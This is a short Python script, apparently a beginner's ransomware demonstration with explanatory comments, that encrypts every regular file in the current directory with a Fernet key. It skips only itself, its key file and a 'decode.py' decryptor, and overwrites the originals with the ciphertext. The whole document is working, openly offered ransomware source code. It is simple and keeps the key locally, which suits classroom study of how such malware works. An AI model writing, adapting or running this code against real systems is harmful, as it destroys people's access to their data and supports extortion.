import os

#necessary for encryption/decryption
from cryptography.fernet import Fernet

#comment - a variable that will store file names of the victim's files
victims_files = []

#a for loop that will list each file in the victim's directory
for file in os.listdir():

        #an exception so that the encryption/decryption does not affect these files
        if file == "ransomware.py" or file == "thekey.key" or file == "decode.py":
                continue

       #in case other file types exist that can't be modified ex. folders, directories, etc,.
        if os.path.isfile(file):
                victims_files.append(file)

#print the list of victim's files
print(victims_files)

#generate crypto key
key = Fernet.generate_key()

#write/create the key ("wb" - write in binary) in a file called thekey.key
with open("thekey.key", "wb") as thekey:
        thekey.write(key)

#a for loop to examine and modify each file in the directory
for file in victims_files:

        #open each file and store its info inside the variable contents
        with open(file, "rb") as thefile:
                contents = thefile.read()

        #use the key to encrypt contents
        encrypt_contents = Fernet(key).encrypt(contents)

        #overwrite the contents of each file using the encrypted version
        with open(file, "wb") as thefile:
                thefile.write(encrypt_contents)